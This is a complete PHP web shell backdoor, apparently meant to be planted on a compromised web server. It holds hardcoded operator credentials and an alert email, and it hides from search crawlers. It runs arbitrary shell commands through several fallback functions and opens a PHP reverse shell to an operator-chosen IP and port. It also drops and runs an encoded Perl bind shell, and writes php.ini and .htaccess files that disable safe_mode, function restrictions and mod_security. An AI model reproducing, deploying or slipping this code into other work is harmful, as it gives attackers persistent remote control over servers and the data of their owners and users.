<?php
/*------------------ LOGIN -------------------*/
$username="hermes";
$password="lB3samvmQXsgGINWKRgf4JM0jeIAIU";
$email="hermesshell@yandex.com";
/*------------------ Login Data End ----------*/

@error_reporting(0);

/*------------------ Anti Crawler ------------*/
if(!empty($_SERVER['HTTP_USER_AGENT']))
{
    $userAgents = array("Google","Slurp","Yandex","Rambler","Googlebot","Bingbot","DuckDuckBot","Baiduspider","Sogou","Konqueror", "Exabot","facebot","facebook","ia_archiver");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))
    {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
echo "<meta name=\"ROBOTS\" content=\"NOINDEX, NOFOLLOW\" />"; //For Ensuring... Fuck all Robots...
/*------------------ End of Anti Crawler -----*/


if(($_POST["username"]==$username && $_POST["password"]==$password) or ($_GET["username"]==$username && $_GET["password"]==$password))
{
    if($email!="")
    {
        mail_alert('loged_in');
    }
}
else
{
    mail_alert('log_failed');
    exit;
}


$path=$_GET['path'];
@session_start();
@set_time_limit(0);
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("safe_mode");
@ignore_user_abort(FALSE);
@ini_set('zlib.output_compression','Off');
$safemode=@ini_get('safe_mode');
$sep="/";
if(strtolower(substr(PHP_OS,0,3))=="win")
{
    $os="win";
    $sep="\\";
    $ox="Windows";
}
else
{
    $os="nix";
    $ox="Linux";
}
$self=$_SERVER['PHP_SELF'];
$srvr_sof=$_SERVER['SERVER_SOFTWARE'];
$your_ip=$_SERVER['REMOTE_ADDR'];
$srvr_ip=$_SERVER['SERVER_ADDR'];
$admin=$_SERVER['SERVER_ADMIN'];
$s_php_ini="safe_mode=OFF
disable_functions=NONE";
$ini_php="<?
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"file\"]);
ini_restore(\"safe_mode\");
ini_restore(\"open_basedir\");
echo ini_get(\"safe_mode\");
echo ini_get(\"open_basedir\");
include(\$_GET[\"ss\"]);
?>";
$s_htaccess="<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>";
$s_htaccess_pl="Options FollowSymLinks MultiViews Indexes ExecCGI
AddType application/x-httpd-cgi .sh
AddHandler cgi-script .pl
AddHandler cgi-script .pl";
$sym_htaccess="Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any";
$sym_php_ini="safe_mode=OFF
disable_functions=NONE";
$bind_perl="rZJdb5swFIavi8R/OHXTFSSmZJu2i0abxAjtWApEQLtNVYUoOK1VgimmmqIq/30+dpKmmna1+Aq/7/Fzvjg6HD6JbnjLmmFLuxre/jYN0zjax5EY+P+jMee0oV3R0woKAQW0RdcDn0MQTRL3e5B9g5A1DNJ7WtfwdQlKm84+fhrBdRaf3Wwwe6lmP7MxjSdBIeXlA+3H+uLxZs7u5GXAhcr2GQZae+aiKRZ0hV7Lu/5AOm5yfnU9ulFSx3sutTvaq8/bJUZbJ33ZntgYUC4qaZO6rcgYUw/EUvR0gZpavbjXOptbmJs+AgnTH6z58J7YpvFsGgfrF7IkcuzFYTrzvWMYTvHZShFHWK3MozhCtWWlfnLlJw7MzvIg8jMH0tib5mmW+G7ogC7bBt5BxSgQ/eh0cIhQQXu88/aFksYXOQI0KE/8y9R3JxPptEX5YJGaOPDO3uFtEaegobLVaotDr6iqLmeNpYbqyN8Jebkb/drB4KMNoGZyCM1ORaH704uj6CVaR2ziTWPOO2ssW8VMckJFWVLZkncR+BG2oUD2GMqa4w+g5PXEeYuZskkQOUC+vNEewXVurfgy+6fnJ8lfnt6htd6lklRineb1XbJfCxKIwuoP";


/*--------------- FUNCTIONS ----------------*/
function mail_alert($status)
{
    global $email, $your_ip;
    $shell_path="http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
    $content_mail="Hello Master,\n
Your shell in $shell_path is accessed by ".$_SERVER['REMOTE_ADDR'] ."\n
Status: $status";
    mail($email, "Shell Accessed!!!", $content_mail ,"From:alert@shell.com");
}
function cmd($cmd)
{
    chdir($_GET['path']);
    $res="";
    if($_GET['cmdexe'])
    {
        $cmd=$_GET['cmdexe'];
    }
    if(function_exists('shell_exec'))
    {
        $res=shell_exec($cmd);
    }
    else if(function_exists('exec'))
    {
        exec($cmd,$res);
        $res=join("\n",$res);
    }
    else if(function_exists('system'))
    {
        ob_start();
        system($cmd);
        $res = ob_get_contents();
        ob_end_clean();
    }
    elseif(function_exists('passthru'))
    {
    ob_start();
    passthru($cmd);
    $res=ob_get_contents();
    ob_end_clean();
    }
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(0 => array("pipe", "r"),  1 => array("pipe", "w"),  2 => array("pipe", "w"));
        $handle = proc_open($cmd ,$descriptorspec , $pipes);
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $res .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $res .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }

    else if(function_exists('popen'))
    {
        $handle = popen($cmd , "r");
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $res .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $res .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }

    $res=wordwrap(htmlspecialchars($res));
    if($_GET['cmdexe'])
    {
        echo "".$res;
    }
    return $res;
}
function reverse_conn_bg()
{
    global $os;
    $option=$_REQUEST['rev_option'];
    $ip=$_GET['my_ip'];
    $port=$_GET['my_port'];
    if($option=="PHP Reverse Shell")
    {
        echo "<div id=result><h2>RESULT</h2><hr /><br />";
        function printit ($string)
        {
            if (!$daemon)
            {
        print "$string\n";
            }
        }
        $chunk_size = 1400;
        $write_a = null;
        $error_a = null;
        $shell = 'uname -a; w; id; /bin/sh -i';
        $daemon = 0;
        $debug = 0;
        if (function_exists('pcntl_fork'))
        {
            $pid = pcntl_fork();
            if ($pid == -1)
            {
        printit("ERROR: Can't fork");
        exit(1);
            }
            if ($pid)
            {
        exit(0);
            }
            if (posix_setsid() == -1)
            {
        printit("Error: Can't setsid()");
        exit(1);
            }
            $daemon = 1;
        }
        else
        {
            printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
        }
        chdir("/");
        umask(0);
        $sock = fsockopen($ip, $port, $errno, $errstr, 30);
        if (!$sock)
        {
            printit("$errstr ($errno)");
            exit(1);
        }
        $descriptorspec = array(0 => array("pipe", "r"),  1 => array("pipe", "w"),  2 => array("pipe", "w"));
        $process = proc_open($shell, $descriptorspec, $pipes);
        if (!is_resource($process))
        {
            printit("ERROR: Can't spawn shell");
            exit(1);
        }
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        stream_set_blocking($sock, 0);
        printit("<font color=green>Successfully opened reverse shell to $ip:$port </font>");
        while (1)
        {
            if (feof($sock))
            {
        printit("ERROR: Shell connection terminated");
        break;
            }
            if (feof($pipes[1]))
            {
        printit("ERROR: Shell process terminated");
        break;
            }
            $read_a = array($sock, $pipes[1], $pipes[2]);
            $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
            if (in_array($sock, $read_a))
            {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
            }
            if (in_array($pipes[1], $read_a))
            {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
            }
            if (in_array($pipes[2], $read_a))
            {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
            }
        }
        fclose($sock);
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        echo "<br /><br /><hr /><br /><br /></div>";
    }
    else if($option=="PERL Bind Shell")
    {
        global $bind_perl, $os;
        $pbfl=$bind_perl;
        $handlr=fopen("indrajith_perl_bind.pl", "wb");
        if($handlr)
        {
            fwrite($handlr, gzinflate(base64_decode($bind_perl)));
        }
        else
        {
            alert("Access Denied for create new file");
        }
        fclose($handlr);
        if(file_exists("indrajith_perl_bind.pl"))
        {
            if($os=="nix")
            {
                cmd("chmod +x indrajith_perl_bind.pl;perl indrajith_perl_bind.pl $port");
            }
            else
            {
                cmd("perl indrajith_perl_bind.pl $port");
            }
        }
    }
}
function safe_mode_fuck()
{
    global $s_php_ini,$s_htaccess,$s_htaccess_pl,$ini_php;
    $path = chdir($_GET['path']);
    chdir($_GET['path']);
    switch($_GET['safe_mode'])
    {
        case "s_php_ini":
            $s_file=$s_php_ini;
            $s_name="php.ini";
            break;
        case "s_htaccess":
            $s_name=".htaccess";
            $s_file=$s_htaccess;
            break;
        case "s_htaccess_pl":
            $s_name=".htaccess";
            $s_file=$s_htaccess_pl;
            break;
        case "s_ini_php":
            $s_name="ini.php";
            $s_file=$ini_php;
            break;

    }
    if(function_exists('fopen')&& function_exists('fwrite'))
    {
        $s_handle=fopen("$s_name", "w+");
        if($s_handle)
        {
            fwrite($s_handle, $s_file);
            alert("Operation Succeed!!!");
        }
        else
        {
            alert("Access Denied!!!");
        }
        fclose($s_handle);
    }
}


//////////////////////////////// Frond End Calls ///////////////////////////////
if(isset($_REQUEST['phpinfo']))
{
    chdir($_GET['path']);
    ob_clean();
    echo phpinfo();
    exit;
}
else if(isset($_GET['path']) && isset($_GET['cmdexe']))
{
    chdir($_GET['path']);
    cmd();
}
else if(isset($_GET['rev_option']) && isset($_GET['my_ip']) && isset($_GET['my_port']))
{
    reverse_conn_bg();
}
else if(isset($_GET['path']) && isset($_GET['safe_mode']))
{
    safe_mode_fuck();
}
////////////////////////////// End Frond End Calls //////////////////////////////
?>